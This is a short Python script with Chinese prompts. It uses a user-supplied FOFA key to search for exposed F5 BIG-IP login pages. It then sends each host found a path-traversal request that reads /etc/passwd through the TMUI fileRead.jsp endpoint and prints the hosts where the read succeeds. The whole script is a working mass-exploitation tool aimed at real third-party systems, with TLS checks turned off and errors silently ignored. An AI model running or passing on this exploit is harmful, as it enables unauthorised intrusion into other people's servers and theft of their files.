import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import re
import time
from bs4 import BeautifulSoup
import base64


apikey=input("请输入fofaapikey:")

keyword = 'title="BIG-IP&reg;- Redirect"'
keyword = keyword.encode('utf-8')
keyword = base64.b64encode(keyword)
keyword = keyword.decode()

for page in range(20, 40):
    url = 'https://fofa.so/result'
    header= {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
    }
    headers = {
        "Host": "fofa.so",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
        "Cookie": "_fofapro_ars_session={}".format(apikey)
    }
    params = {
        'page': page,
        'qbase64': keyword
    }
    r = requests.get(url=url, params=params, headers=headers)
    html = r.text
    soup = BeautifulSoup(html, 'lxml')
    a_url = str((soup.select('.list_mod_t')))
    url = re.findall('target="_blank">(.*?)<i', a_url, re.S)
    for ul in url:
        try:
            url = '{}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'.format(ul.rstrip())
            r = requests.get(url=url,headers=header, verify=False)
            html = r.text
            cl = re.findall('"output"', html, re.S)
            if len(cl) > 0:
                print(ul)
        except Exception as e:
            pass

    time.sleep(3)

